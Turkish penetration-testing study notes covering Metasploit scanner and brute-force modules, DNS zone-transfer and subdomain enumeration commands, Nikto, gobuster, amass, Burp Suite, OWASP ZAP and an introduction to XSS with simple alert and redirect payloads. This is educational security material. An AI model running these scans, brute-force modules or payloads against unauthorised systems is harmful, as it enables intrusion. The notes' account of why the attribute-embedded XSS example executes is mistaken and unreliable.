o   **auxiliary/scanner/http/http_version:** HTTP sunucularının sürüm bilgilerini toplar.
o   **auxiliary/scanner/mysql/mysql_version:** MySQL veritabanı sunucusunun sürümünü tespit eder.
o   **auxiliary/scanner/ftp/anonymous:** Hedef sistemdeki FTP servisinde anonim girişin mümkün olup olmadığını kontrol eder.
o   **auxiliary/scanner/portscan/syn:** SYN taraması ile hızlı bir TCP port taraması yapar.
o   **auxiliary/scanner/mssql/mssql_login:** MSSQL veritabanı sunucusunda kaba kuvvet ile giriş denemesi yapar.
o   **auxiliary/scanner/discovery/udp_sweep:** Belirtilen ağ aralığında UDP port taraması yapar.
o   **auxiliary/scanner/http/dir_scanner:** Web sunucusundaki dizinleri ve dosyaları arar.
o   **auxiliary/scanner/http/http_header:** Bu modül, hedefteki web sunucusuna yapılan HTTP isteklerine verilen HTTP başlıklarını (headers) toplar.
o   **auxiliary/scanner/http/files_dir:** Bu modül, hedef web sunucusunda belirli dosya ve dizinleri keşfetmek için kullanılır.
o   **auxiliary/scanner/http/dir_scanner**
o   **auxiliary/scanner/http/http_put**
o   **post/multi/manage/shell_to_meterpreter:** Alınan shelli meterpretera dönüştürür.
o   **auxiliary/scanner/http/options:** Sunucunun kabul ettiği metodları belirler ve bu oldukça önemlidir.
o   **auxiliary/admin/mysql/mysql_sql:** MySql sunucusunda SQL sorguları çalıştırmamızı sağlar.
o   **auxiliary/scanner/smb/smb_enumusers:** SMB üzerinden hedef sistemdeki kullanıcı hesaplarını listeler.
o   **auxiliary/scanner/ssh/ssh_login:** SSH servisine kaba kuvvet ile giriş denemesi yapar.
o   **auxiliary/scanner/telnet/telnet_version:** Telnet servisinin sürüm bilgisini tespit eder.
o   **auxiliary/gather/enum_shares:** SMB üzerinden paylaşılan dosya ve klasörleri listeler.
o   **auxiliary/scanner/http/wordpress_login_enum:** WordPress sitelerinde kaba kuvvet ile giriş denemesi yapar ve kullanıcı adlarını listeler.
o   **auxiliary/scanner/vnc/vnc_login:** VNC servisine kaba kuvvet ile giriş denemesi yapar.
o   **auxiliary/scanner/imap/imap_version:** IMAP servisinin sürümünü tespit eder.
o   **auxiliary/scanner/ldap/ldap_version:** LDAP servisinin sürüm bilgilerini toplar.
o   **auxiliary/scanner/netbios/nbname:** NetBIOS isimlerini ve IP adreslerini tespit eder.


###### Vulnerability Scaning with MSF:

Güvenlik açığı taraması, bir hedef sistemin zayıf noktalarını belirlemek için yapılan işlemdir. Bu zayıflıklar, bir saldırgan tarafından sömürülebilecek ve sisteme zarar verebilecek hatalar, yanlış yapılandırmalar veya eski yazılımlar olabilir. Özellikle  hedef sisteme payloada göndermeden sadece güvenlik açıklığının var olup olmadığını gösteren auxiliary modüllerinden faydalanılabilir.

Ayrıca, hedef sistemte workspace içinde tarama yapıldıktan sonra **“analyze”** komutunu çalıştırarak olası kullanılabilecek exploit modüllerinden yararlanılabilir.  **“vulns”** komutunu kullanarak da hedef sistemdeki güvenlik açıklıkları hakkında bilgi sağlanılabilir.


#### DNS Enumeration(active):

**DNS (Domain Name System) zone transferi**, bir DNS sunucusundan (genellikle birincil/primary DNS) başka bir DNS sunucusuna (genellikle ikincil/secondary DNS) **DNS zone dosyasının tamamının kopyalanması işlemidir**. Bu işlem, DNS kayıtlarının yedekli olarak saklanmasını ve DNS sunucuları arasında tutarlı olmasını sağlar.

*DNS Zone Dosyası Nedir?*

Zone dosyası, bir etki alanına (domain) ait tüm DNS kayıtlarını içeren **metin tabanlı bir dosyadır**. Bu dosyada aşağıdaki bilgiler bulunur:
- **A kayıtları:** Domain veya subdomain isimlerini IP adreslerine eşler.
- **AAAA kayıtları:** IPv6 adreslerini eşler.
- **MX kayıtları:** Domain’in e-posta sunucularını belirtir.
- **NS kayıtları:** Domain’in yetkili isim sunucularını gösterir.
- **CNAME kayıtları:** Bir domain adını başka bir domaine yönlendirir.
- **TXT kayıtları:** Domain ile ilgili açıklamalar veya doğrulama bilgileri içerir (ör. SPF, DKIM).
- **SOA (Start of Authority) kaydı:** Zone dosyasının yetkili sunucusu, seri numarası, güncelleme sıklığı gibi yönetim bilgilerini içerir.
- **PTR kayıtları:** IP adreslerini host isimlerine çözer (ters DNS).

*Zone Transferi İşleyişi*

- Birincil DNS sunucusu, ikincil DNS sunucularına zone dosyasının kopyasını sağlar.
- İkincil sunucular, zone transferi (AXFR veya IXFR) yoluyla zone dosyasını alır ve günceller.
    - **AXFR (Full Zone Transfer):** Tüm zone dosyasının tam olarak kopyalanmasıdır.
    - **IXFR (Incremental Zone Transfer):** Sadece değişikliklerin aktarılmasıdır.
- Bu mekanizma sayesinde DNS sunucuları **güncel ve tutarlı bilgi sunar**.

*Güvenlik Açısından Önemi*

Yetkisiz bir kişi zone transferi yapabilirse, domain’e ait:
- Tüm host isimleri ve IP adresleri,
- Mail sunucuları ve diğer servis bilgileri,
- Subdomainler ve ağ yapısı
gibi kritik bilgilere ulaşabilir. Bu, saldırganlara hedef ağ ve servisler hakkında kapsamlı bilgi sağlar.

Yetkisiz kişiler zone transferi yapabilirse, DNS kayıtlarını ele geçirebilirler. Bu nedenle, zone transferlerinin sadece güvenilir ve yetkili sunuculara yapılmasını sağlamak önemlidir. Bu sorun, DNS sunucularında IP tabanlı erişim kontrolü ve güvenlik duvarlarıyla önlenebilir.

*Dnsenum*, bir domainin DNS bilgilerini toplarken zone transferi yapmayı da dener. Eğer bir DNS sunucusu zone transferine izin veriyorsa, dnsenum bu işlemi gerçekleştirebilir ve domain'e ait DNS kayıtlarının tamamını elde edebilir. Bu bilgiler, subdomain'ler, IP adresleri, mail sunucuları gibi çeşitli DNS kayıtlarını içerir. Güvenlik açısından doğru yapılandırılmadığı takdirde, yetkisiz kişilerin tüm DNS kayıtlarına erişmesine olanak tanır.

==Ayrıca DNS sunucusu, zone transferi talebine izin veriyorsa ve bu işlem doğru bir şekilde sınırlanmazsa, iç DNS kayıtları da bu transferle birlikte dış dünyaya sızabilir. Bu, sadece halka açık  subdomain'leri değil, aynı zamanda iç kullanım için oluşturulmuş ve gizli tutulması gereken subdomain'leri de içerir.==

 Aktif tarama aşamasında  dnsenum   ve dig kullanılarak zone transferi denenir. Bu sistemlerde log oluşturacağı için aktif bilgi toplama yöntemidir.

	o  dnsenum example.com (Bu komut, example.com domaini üzerinde çeşitli DNS bilgi toplama işlemleri yapar, bu işlemler arasında zone transferi denemesi de bulunur.)
	o  dig axfr @ns1.example.com   example.com

*Fierce* toolu ile hedefe yönelik DNS taramaları yaparak subdomainler keşfedilebilir

	o  fierce -dns examplecompany.com -wordlist = /example.txt

Fierce DNS brute force yerine daha spesifik ve hedefe yönelik sorgular yapar. Sözlük tabanlı brute force yerine, hedef domain ve ağ hakkında daha fazla bilgi toplamak için stratejik sorgulamalar gerçekleştirir. Bu da onu dnsenum’un brute force ile subdomain keşfi özelliğinden ayırır çünkü  daha hafif bir şekilde tarama yapar.

https://digi.ninja/projects/zonetransferme.php Zonetransferi uygulayabileceğimiz eğitim amaçlı bir web sitesidir.
==Zonetransfer ile gizli subdomainleri bulabiliriz. Geliştirme ortamları için kullanılan ve halka açık subdomainler çeşitli zafiyetler içerebilir.==

#### SubDomain Enumeration(active):

Aktif subdomain tarama (active subdomain enumeration), bir hedef domainin alt alan adlarını **hedef sistemle doğrudan etkileşime girerek** keşfetme yöntemidir. Yani pasif taramadan farklı olarak (sadece açık kaynaklardan toplama yerine), hedefin DNS kayıtları veya servisleri üzerinde sorgular yaparak çalışır veya bruteforce ile belirlemeye çalışır.

Amaçlar:

- Hedefin saldırı yüzeyini genişletmek.  
- Gizlenmiş ya da unutulmuş servisleri (ör. test, staging, admin panelleri) ortaya çıkarmak.
- Pentest ve Red Team senaryolarında daha kapsamlı keşif yapmak.

Kullanılabilecek araç listesi:

- *sublist3r*: Google dorksları da kullanarak açık kaynaklardan subdomainleri bulur. Bunun için Google, Yahoo, Bing, Baidu gibi tarayıcıları Netcraft, Virustotal gibi araçları ve daha fazlasını kullanır. 
  Ama aynı zamanda brute-force gibi aktif tarama özellikleri de vardır.
		Temel kullanım:  `sublist3r -d example.com`
- *fierce*: aktif subdomain keşfi için kullanılan, özellikle DNS üzerinden zonetransfer  keşfi de  yaparak ve bruteforce ile de kullanılabilen bir araçtır.
		`fierce  --domain example.com  --subdomain-file  wordlist.txt`
- *gobuster*: Directory, subdomain vb. keşfinde yüksek performanslı bir araçtır.
		**Multiple Modes**: Directory, DNS, virtual host, S3, GCS, TFTP, and fuzzing modes https://github.com/OJ/gobuster
		`gobuster dns -do example.com -w /path/to/wordlist.txt`

#### Webserver Vulnerability Scanning with Nikto(active):

Nikto çok kapsamlı bir araç olup çeşitli özellikleri/kullanımları bulunmaktadır.Web uygulama güvenlik testlerinde de  kullanılan  ve **web sunucu taraması** özelliği de bulunan açık kaynaklı bir araçtır.
==Ayrıca potansiyel riskli olabilecek dosya ve dizinleri de taramaya dahil ederek gösterecektir.(https://github.com/sullo/nikto)==

*Özellikler:*
Tehlikeli/yanlış yapılandırılmış dosyalar
Varsayılan dosyalar (örn: `phpinfo.php`, `admin/`, `test/`)
Potansiyel tehlikeli CGI scriptleri
Güvensiz HTTP yöntemleri (PUT, DELETE vs.)
Eski / güncellenmemiş yazılım versiyonları.

En temel kullanımı:
	`nikto -h <website_url>  -o result.html -Format htm` ( h--> host )
Yukarıda html olarak bir rapor çıktısı alırız. Buı rapor terminale göre daha anlaışılır olup  yapılan isteklerin linklerini de içerir.
#### File & Directory Enumeration (gobuster): 

Gobuster, **Go diliyle yazılmış**, hızlı ve hafif bir **brute force tabanlı dizin ve subdomain tarama aracıdır**. Bu amaçla dirb de kullanılıyor olsa da gobuster bir standarttır.

- Temel subdomain Kullanım:
`gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt`
 - DNS subdomain enumeration
 `gobuster dns -do example.com -w /path/to/wordlist.txt`

#### Automated Web Recon with OWASP Amass:

OWASP Amass, açık kaynak bilgi toplama ve aktif keşif teknikleri kullanarak ağ haritalama ve dış varlık keşfi gerçekleştiren bir otomasyon aracıdır. Subdomain numaralandırma, varlık keşfi, DNS keşfi ve dış altyapı haritalama için tasarlanmış gelişmiş bir açık kaynak araçtırş.

**1. Basit Subdomain Numaralandırma:**

```bash
amass enum -d example.com
```

**2. Pasif Keşif (Sadece OSINT):**

```bash
amass enum -passive -d example.com
```

**3. Aktif Keşif:**

```bash
amass enum -active -d example.com
```

**4. Çoklu Domain Tarama:**

```bash
amass enum -d example.com,target.com -o results.txt
```

**5. Rate Limiting ile:**

```bash
amass enum -d example.com -max-dns-queries 200
```

https://github.com/owasp-amass/amass

Hedef organizasyonun dış saldırı yüzeyini haritalama gibi görrselleştirme özellikleri de vardır.
# Web Proxies and Web Information Gathering(WPT):

*Proxy Nedir?*

**Proxy (vekil sunucu)**, iki sistem arasında aracı görevi görür. Senin ile internet arasına girerek istek ve yanıtları görmeyi, değiştirmeyi veya yönlendirmeyi sağlar.

Basit bir örnek verecek olursak;
Sen bir web sitesine gitmek istiyorsun → isteğin önce **proxy’ye gider** → proxy bu isteği hedef siteye iletir → gelen yanıtı yine **proxy üzerinden alırsın**.
## Web Proxy:

**Web proxy**, özellikle **HTTP/HTTPS trafiğini yakalayıp analiz etmek** için kullanılan bir tür proxy’dir. Özellikle web uygulamalarına yapılan isteklerin:

- yakalanmasını,
- değiştirilmesini,
- analiz edilmesini   sağlar. Bu amaçla Burpsuite ve OWASP Zap araçlarına teker teker bakacağız.
### BurpSuite: 

Burp Suite, PortSwigger tarafından geliştirilen, web uygulamalarının güvenliğini test etmek için kullanılan bir sızma testi aracı ve proxydir.. HTTP/HTTPS trafiğini yakalayarak analiz eder, güvenlik açıklarını tespit eder ve saldırı senaryolarını simüle eder. Java ile yazılmış olup Windows, Linux ve macOS'ta çalışır.

**Temel Özellikler:**

- **Proxy:** Web trafiğini yakalar, düzenler ve yönlendirir.
- **Spider/Crawler:** Web uygulamasını tarar, yapı ve içerikleri indeksler. ( Community'de pasif crawler olup spider özelliği premiumdur.)
- **Scanner:** SQL Injection, XSS gibi zafiyetleri otomatik tespit eder (Professional/Enterprise sürümlerde).
- **Intruder:** Brute force ve payload testleri yapar.
- **Repeater:** İstekleri tekrar gönderip yanıtları analiz eder.
- **Decoder:** Verileri kodlar/çözümler.
- **Comparer:** İki veri setini karşılaştırır.
- **Extender:** Eklentilerle özelleştirme sağlar.
- **Sequencer:** Rastgele veri kalitesini test eder.
#### Burp Target & Scope:

Web Uygulaması pentestleri gerçekleştirirken, test edeceğiniz web uygulamalarına göre proje kapsamınızı tanımlamak ve belirtmek önemlidir. 
Burp Suite'teki Hedef sekmesi, kendi kapsamınızı tanımlamanıza olanak tanır; bu, sonuç olarak Burp tarafından hangi isteklerin/yanıtların proxy'leneceğini belirleyecektir. 
Bu, Burp'un önceden tanımlanmış kapsam dışında kalan etki alanları için herhangi bir trafiği günlüğe kaydetmeyeceği için çok kullanışlıdır, çünkü hedef siteleri dahil etme veya hariç tutma olanağınız vardır.

Hedef kapsamınızı belirlemek, web uygulaması pentestleri veya hata avcılığı için en önemli unsurlardan biridir ve genellikle yeni başlayanlar veya acemiler tarafından göz ardı edilir. Hata avcılığı yaparken, testlerinizi değerlendirdiğiniz/test ettiğiniz üçüncü taraf satıcı tarafından önceden tanımlanmış kapsamla sınırlandırmanız hayati önem taşır.

Site haritası, hedef sitede manuel olarak ziyaret ettiğiniz tüm URL'leri (veya bir kapsam yapılandırmadıysanız, ziyaret ettiğiniz tüm sitelerin URL'lerini) gösterecektir. Site haritası, hedeflediğiniz web uygulamalarını haritalandırmak için çok kullanışlıdır ve web uygulamasının genel yapısını özetleyen kullanışlı bir site haritası ağacı sağlar Burp Suite Professional ayrıca, manuel pasif tarama yapmaya gerek kalmadan hedef web uygulamalarınızı otomatik olarak tarama olanağı da sunar
#### Burp Suite Intruder:

**Burp Suite Intruder**, son derece güçlü bir **fuzzing modülüdür**. Bu modül sayesinde, yakalanan bir HTTP isteğini şablon olarak kullanabilir, istek içindeki parametreleri değiştirebilir ve bu istekleri hedef web uygulamasına otomatik olarak gönderebilirsiniz.
Basitçe ifade etmek gerekirse, Intruder; **HTTP isteklerinin otomatik olarak gönderilmesini sağlayarak çeşitli testlerin yapılmasına olanak tanır**.

Intruder birçok farklı amaç için kullanılabilir. En yaygın kullanım senaryosu ise, **HTTP isteklerindeki belirli parametreleri değiştirerek brute-force (kaba kuvvet) saldırıları gerçekleştirmektir**.

Bu saldırılar yalnızca kullanıcı adı ve parola gibi kimlik bilgilerini brute-force yöntemiyle kırmakla sınırlı değildir. Aynı zamanda, bir çerez değeri, yönlendirme parametresi ya da istenen bir sayfa gibi **herhangi bir parametreye yönelik brute-force testleri** de Intruder ile yapılabilir.

**Intruder**, HTTP isteklerini hedefe göndermeden önce bu istekler üzerinde değişiklik yapmanıza olanak tanır. Bu işlem iki temel bileşenle gerçekleştirilir:
##### Pozisyonlar (Positions)
İsteğin hangi bölümlerinin değiştirileceğini belirtir. Aynı zamanda, hangi tür saldırının gerçekleştirileceği üzerinde de etkilidir.
##### Yükler (Payloads)
Pozisyonlara yerleştirilecek değerleri tanımlar. Brute-force saldırılarında yükler genellikle bir **kelime listesi** şeklindedir (örneğin: parolalar, kullanıcı adları, token değerleri vb.

---
##### Saldırı Türleri 

###### Sniper

- Tek bir yük kümesi kullanır.
- Aynı anda yalnızca bir pozisyonda test yapılır.
- Örneğin: her seferinde sadece bir parametreye yük uygulanır.
###### Battering Ram

- Tek bir yük kümesi kullanır.
- Belirtilen tüm pozisyonlara aynı yük değeri yerleştirilir.
- Yani, bir değer seçilir ve tüm konumlarda aynı anda test edilir.
######  Pitchfork

- Her pozisyon için ayrı bir yük kümesi tanımlanır.
- Tüm yükler eş zamanlı ve sıralı olarak her pozisyona uygulanır.
- Örneğin: kullanıcı adı ve parola listeleri aynı sırada ilerletilir (1. kullanıcı adı ile 1. parola, 2. ile 2. vb.).

#### Burp Suite Repeater:

**Burp Suite Repeater**, web uygulamalarına gönderilen HTTP isteklerini düzenleyip tekrar göndermenizi sağlayan güçlü bir araçtır. Bu sayede, yapılan değişikliklerin sunucu yanıtını nasıl etkilediğini gözlemleyebilirsiniz.

Repeater özellikle şu amaçlarla kullanılır:

- Web uygulamasının davranışlarını anlamak,
- Güvenlik açıklarını (örneğin **SQL Enjeksiyonu (SQLi)**, **Komut Enjeksiyonu**, **XSS**) test etmek,
- Özel olarak hazırlanmış yüklerin (payload) etkisini denemek,
- Fuzzing (farklı girişlerle sistemin tepkisini görmek) işlemlerini manuel olarak gerçekleştirmek.

Özellikle otomatik araçların gözden kaçırabileceği durumları elle test etmek için oldukça kullanışlıdır. Bir isteği defalarca düzenleyip göndererek sistemin nasıl davrandığını dikkatlice inceleyebilirsiniz.

*NOT:* Temel anlamda Intruder’a benzerlik gösterir, çünkü ikisi de HTTP istekleri üzerinde değişiklik yaparak uygulamanın verdiği yanıtları analiz etmeye yarar. Ancak Repeater daha çok manuel, tekil ve kontrollü testler için kullanılırken; Intruder, çok sayıda isteği otomatik ve hızlı şekilde göndererek geniş çaplı saldırılar (örneğin brute-force veya fuzzing) için kullanılır."

### ZAP (Zed Attack Proxy):

**OWASP ZAP**, Java ile geliştirilmiş, dünyanın en popüler **açık kaynaklı** ve **ücretsiz** web proxy ve güvenlik tarayıcılarından biridir. OWASP (Open Web Application Security Project) projesinin bir parçası olan ZAP, topluluk tarafından aktif olarak geliştirilmekte ve bakımına devam edilmektedir.
Sızma testi uzmanları, geliştiriciler ve güvenlik araştırmacıları tarafından **web uygulamalarının güvenliğini analiz etmek, haritalamak ve değerlendirmek** amacıyla kullanılmaktadır.

**OWASP ZAP'in sunduğu başlıca özellikler:**
- Web tarayıcınız ile web sunucusu/uygulaması arasındaki istek ve yanıtları yakalama yeteneği
- Pasif ve aktif olmak üzere otomatik web uygulaması taraması
- Web örümcekleme (spidering) özelliği, ayrıca aktif örümcekleme desteği
- Sınırlama olmaksızın tam özellikli "Intruder" (saldırı aracı) işlevselliği

![[Ekran görüntüsü 2025-07-06 000039.png]]

#### Modes:

![[Ekran görüntüsü 2025-07-06 012345.png]]

![[Ekran görüntüsü 2025-07-06 012450.png]]
In the Protected Mode, OWASP ZAP prevents you from performing intrusive/active actions on sites outside of your defined scope.
#### Bar:

![[Ekran görüntüsü 2025-07-06 013931.png]]

Zap'ın yukarıdaki barını kullanarak görünüm ( tema, request-response görünümü vb), eklenti mağazası, tarayıcı, HUD ce daha fazla bu bardan hızlıca ayarlanabilir.

![[Ekran görüntüsü 2025-07-06 014217.png]]

Örneğin yukarıdaki mağazada birçok ücretsiz eklenti görülmektedir.

*NOT:* Zap'daki request editör BurpSuite'deki Repeater'a denktir.
#### Forced Browse:

"Forced Browsing", ZAP'da normalde kullanıcı arayüzünde görünmeyen ancak doğrudan URL girilerek erişilebilecek dosya veya dizinleri keşfetme tekniğidir.

![[Ekran görüntüsü 2025-08-03 231809.png]]

Yukarıdaki gibi hedefe yönelik taramada "common.txt"  wordlisti sağlanmıştır.

#### Web App Scanning with ZAP:

OWASP ZAP (Zed Attack Proxy) aracında aktif tarama (active scan), bir web uygulamasındaki güvenlik açıklarını tespit etmek için kullanılan otomatik bir test yöntemidir. Aktif tarama, hedef uygulamaya bilinen saldırı tekniklerini kullanarak özel olarak hazırlanmış istekler gönderir ve uygulamanın yanıtlarını analiz ederek potansiyel güvenlik açıklarını (örneğin, SQL enjeksiyonu, XSS, CSRF) belirler. Bu süreç, pasif taramadan farklı olarak, uygulamanın işlevselliğine müdahale edebilir ve veri değişikliği gibi riskler taşıyabilir.

#### Spidering:

*Tanım:*

Spidering, bir web sitesini **tarayıp, içinde bulunan tüm linkleri**, formları ve URL'leri takip ederek, **uygulamanın yapısını ve gezinilebilir yollarını otomatik olarak çıkarmaktır**.

*Nasıl çalışır?*

- Ana sayfadan başlar, HTML içindeki `<a href=...>`, `<form action=...>` gibi öğeleri tarar.
- Bulduğu bağlantılara tıklayıp devam eder.
- JavaScript içindeki linkleri genellikle görmez (AJAX spider farklıdır).

*Örnek:*

`<a href="/login">Login</a> <a href="/products">Products</a>`

Spider bu URL’leri görebilir ve `/login`, `/products` sayfalarına da gidip oradaki linkleri de çıkarabilir.

 *Özellikleri:*

- Site haritası çıkarır.
- Mevcut, erişilebilir linkleri kullanır.
- Hızlı ve düşük risklidir.
- Sunucuyu zorlamaz, "normal kullanıcı gibi" davranır. ***Ancak burada thread sayısına dikkat etmek gerekir.*

==NOT:==

![[Ekran görüntüsü 2025-08-04 205635.png]]

- **Spidering**, uygulamayı genel olarak tanımak ve taranabilir alanları görmek için idealdir.
- **Dizin taraması**, gizli kalmış veya güvenliğe tehdit oluşturabilecek dizinleri keşfetmek için gereklidir.


---


# Web Application Penetration Testing: XSS Attacks(WPT): 

*Gereksinimler:*
- HTTP/HTTPS temelleri
- ZAP ve/veya BurpSuite temelleri
- Temel JavaScript bilgisi

*Kapsam:*
- XSS (Cross-Site Scripting) açıklarının ne olduğu, nasıl oluştuğu ve nasıl tespit edileceği.
- Reflected XSS açıkları: tespit edilmesi ve istismar edilmesi.
- Stored XSS açıkları: tespit edilmesi ve istismar edilmesi.
- DOM tabanlı XSS açıkları: tespit edilmesi.
## Introduction to Cross Site Scripting (XSS):

**Cross-Site Scripting (XSS)**, istemci tarafında ortaya çıkan bir web güvenlik açığıdır. Bu açık, saldırganların web sayfalarına **zararlı scriptler (komut dosyaları)** enjekte etmesine olanak tanır.
Genellikle bu zafiyet, web uygulamalarında **girdi doğrulama veya temizleme (input validation/sanitization)** eksikliğinden kaynaklanır.
Saldırganlar XSS açıklarını kullanarak zararlı kod parçacıklarını uygulamalara enjekte eder. ==XSS istemci taraflı bir açık olduğu için, enjekte edilen scriptler doğrudan **kurbanın tarayıcısı** tarafından çalıştırılır.==

XSS güvenlik açıkları özellikle **JavaScript, Flash, CSS** gibi istemci taraflı teknolojilerden yararlanan ve kullanıcı girdilerini doğru şekilde doğrulamayan web uygulamalarında görülür. Bu da saldırganların **oturum çalma, kimlik bilgilerini ele geçirme, kullanıcıyı sahte sayfalara yönlendirme veya tarayıcı üzerinde yetkisiz işlemler gerçekleştirme** gibi saldırılar yapmasına zemin hazırlar.
#### XSS (Cross-Site Scripting) Türleri  :
1. **Stored / Persistent XSS (Depolanmış XSS):**  
    Zararlı kod, sunucuya (örneğin bir veritabanına, yorum alanına veya profile) kaydedilir.  
    Sonrasında bu içeriğe erişen her kullanıcı, zararlı kodu çalıştırır.
2. **Reflected XSS (Yansıtılmış XSS):**  
    Zararlı kod, URL veya kullanıcı girdisi üzerinden doğrudan yansıtılır.  
    Kullanıcı zararlı linke tıkladığında veya özel hazırlanmış sayfayı açtığında çalışır. Sadece kullanıcı etkiler.

*XSS Saldırılarının Amaçları:*

- **Cookie Stealing / Session Hijacking (Çerez Çalma / Oturum Ele Geçirme):**  
    Kullanıcının oturum bilgilerini çalarak saldırganın başka bir kullanıcı gibi giriş yapmasına imkân verir.
- **Browser Exploitation (Tarayıcı Açıkları):**  
    Tarayıcıdaki güvenlik açıklarını sömürerek zararlı eylemler gerçekleştirme.
- **Keylogging (Tuş Kaydı):**  
    Kullanıcının yazdığı bilgileri (örneğin şifre, kredi kartı numarası) kaydetmek.
- **Phishing (Oltalama):** Sahte giriş formlarının bir web sayfasına enjekte edilerek kullanıcıların **kullanıcı adı ve şifre gibi kimlik bilgilerini** ele geçirmesi. Bunun dışında da birçok farklı saldırı senaryosunda kullanılabilir.
##### Stored XSS Basics:

**Stored Cross-Site Scripting (Stored XSS)**, bir saldırganın **temizlenmemiş bir kullanıcı girdisi aracılığıyla** bir web uygulamasının veritabanına veya kaynak koduna **JavaScript kodu enjekte edebilmesine** olanak tanıyan bir güvenlik açığıdır.

Örneğin, bir saldırganın bir web sayfasına **zararlı bir XSS yükü (payload)** enjekte edebildiğini düşünelim. Eğer web uygulaması bu girdiyi doğru şekilde temizlemiyorsa(proper sanitization), enjekte edilen XSS kodu o sayfayı ziyaret eden **her kullanıcının tarayıcısı tarafından çalıştırılır**. Bu durum, saldırganın kullanıcı oturumlarını çalması, kimlik bilgilerini ele geçirmesi veya istemci tarafında başka kötü niyetli işlemler yapabilmesine imkan tanır.

![[Ekran görüntüsü 2025-09-02 171310.png]]
..
##### Reflected  XSS Basics:
**Reflected (Non-Persistent) Cross-Site Scripting (XSS)**, en yaygın XSS türüdür. Bu saldırı türünde, saldırgan **kurbanı özel olarak hazırlanmış bir bağlantıya (link) tıklamaya kandırır**; bu link, XSS yükü (payload) içerir ve hedef web sitesine yönlendirme yapar.

Kurban linke tıkladığında, web sitesi **XSS yükünü yanıtın bir parçası olarak kurbanın tarayıcısına gönderir** ve payload burada çalıştırılır. Bu sayede saldırgan, kurbanın tarayıcısı üzerinden **oturum çalma, kimlik bilgilerini ele geçirme veya başka kötü amaçlı işlemler gerçekleştirme** gibi eylemleri gerçekleştirebilir.

![[Ekran görüntüsü 2025-09-02 172229.png]]

#### JavaScript Temelleri ve XSS Uygulanması Mantığı:

**JavaScript**, istemci tarafında çalışan yüksek seviyeli bir betik (scripting) dilidir ve genellikle **dinamik ve etkileşimli web sayfaları ile web uygulamaları geliştirmek** için kullanılır.
1995 yılında **Brendan Eich** tarafından geliştirilmiş olup, **nesne yönelimli (object-oriented), fonksiyonel (functional) ve prosedürel (procedural) programlamayı** destekler.

*JavaScript neden kullanılır?*

Web sayfalarına kullanıcı etkileşimi eklemek için kullanılır; örneğin animasyonlar, form doğrulama ve diğer etkileşimli özellikler.
JavaScript, **web tarayıcıları tarafından çalıştırılır** ve **Document Object Model (DOM)** ile etkileşime girerek sayfa içeriğini değiştirebilir. ==Ayrıca **sunucu tarafı kaynaklarla** veri talep etmek ve farklı görevleri gerçekleştirmek için de kullanılabilir.==

Tarayıcınızda JavaScript çalıştırmak tehlikeli gibi görünse de, tarayıcılar JavaScript’i **kullanıcı alanında düşük yetkili bir sandbox içinde** çalıştırır. Bu sayede kod, sistemin geri kalanına zarar veremez ve güvenli bir şekilde yürütülür.

==JavaScript genellikle **istemci taraflı bir betik dili** olarak kullanılırken, **Node.js**, geliştiricilerin **JavaScript kullanarak sunucu tarafı uygulamalar geliştirmesine** olanak tanıyan runtime ortamı olarak tasarlanmıştır. Node.js, **Chrome’un V8 JavaScript motoru** üzerine kuruludur ve **olay odaklı (event-driven), bloklamayan (non-blocking) I/O modeli** sunar. Bu özellikler, Node.js’i **ölçeklenebilir ve yüksek performanslı uygulamalar geliştirmek için ideal** bir platform haline getirir.==

JavaScript’in **büyük/küçük harfe duyarlı** bir dil olduğunu unutmamak önemlidir. Tarayıcılar, JavaScript kodunu karşılaştıkları sırayla **ardışık (sequential) olarak** çalıştırır.

Bu da şunu ifade eder: Bir web sayfasına dahil edilen JavaScript kodu, **kod içindeki konumuna göre** çalıştırılır. ==Yani, önce yazılan kod önce yürütülür; sonradan eklenen kod ise daha sonra çalışır.==

`<html lang="tr">`
`<head>`
    `<meta charset="UTF-8">`
    `<title>Hoşgeldiniz</title>`
    `<script>alert("Bu bir alarm!")</script>`
`</head>`
`<body>`
    `<h1>Sayfaya Hoşgeldin AE</h1>`
`</body>`
`</html>`

Yukarıdaki HTML'i kaydedip tarayıcıda açtığımızda aşağıda JS Kodunun çalıştırıldığını görürüz. JS kodu sırayla çalıştırlır. 
![[Pasted image 20250902215918.png]]

Yukarıdaki işlem her ne kadar masum da olsa bu tehlikeli bir durumdur.  Yukarıdaki yapıya ek bir script daha ekleyip yönlendirme yapabiliriz:

`<html lang="tr">`
`<head>`
    `<meta charset="UTF-8">`
    `<title>Hoşgeldiniz</title>`
    `<script>alert("Bu bir alarm!")</script>`
    `<script>`
    `window.location.href = "https://www.trendyol.com"</script>`   ---> Örneğin burada zararlı içerikli bir websitesine yönlendirme yapılabilir

`</head>`
`<body>`
    `<h1>Sayfaya Hoşgeldin AE</h1>`
`</body>`
`</html>`

Burada öğrendiğimiz şey aslında JavaScriptin temel çalışma mantığı ve tarayıcılar üzerinde ne kadar güçlü bir betik dili olduğudur. Saldırganlar bunu kendi amaçları için kullanabilir.

https://github.com/payloadbox/xss-payload-list  xss olup olmadığını anlamak için çeşiltli payloadlar sağlayan github deposu.

*ÖRNEK SENARYO:*
Senaryonun özet:
- Login formunda **kullanıcı adı** ve **parola** alanları var.
- Yanlış giriş yapıldığında:
    - **Kullanıcı adı** tekrar forma yazılı olarak geliyor.
    - **Parola alanı** ise boş bırakılıyor (tarayıcıda gözükmüyor).
    
**Neden kullanıcı adı geri dönüyor?
- Çoğu web uygulaması, kullanıcı deneyimi için “yanlış parola girdiniz” dediğinde kullanıcı adını tekrar forma basar. Yani sunucudan böyle bir yanıt döner.
- Bunu yaparken, sunucu kullanıcı adını **doğrudan HTML içine yazıyorsa** ve girdi temizlenmiyorsa, XSS açığına yol açabilir.

`<input type="text" name="username" value="Atakan<script>alert(1)</script>"> ` 

Örnek (tehlikeli kullanım):
Eğer uygulama `Atakan<script>...` gibi ham değeri yazarsa, JavaScript çalışır → **Reflected XSS**.

HTML parser şöyle davranıyor:

- `value="Atakan` → input’un attribute değeri başlıyor.
- `"` kapatılmadığı için parser devam ediyor.
- `<script>` görünce: “Hmm, bu artık yeni bir tag.” → **HTML’in içine enjekte edildi.**
- `alert(1)` çalıştırılıyor.

Yani **attribute’yi kırıp HTML akışına sızıyor.** Bu da XSS’in özüdür.
## Introduction to Reflected XSS:

**Reflected (Non-Persistent) Cross-Site Scripting (XSS)**, en yaygın XSS türüdür. Bu saldırı, kurbanın **özel olarak hazırlanmış bir bağlantıya (XSS payload içeren)** tıklamasıyla gerçekleşir.
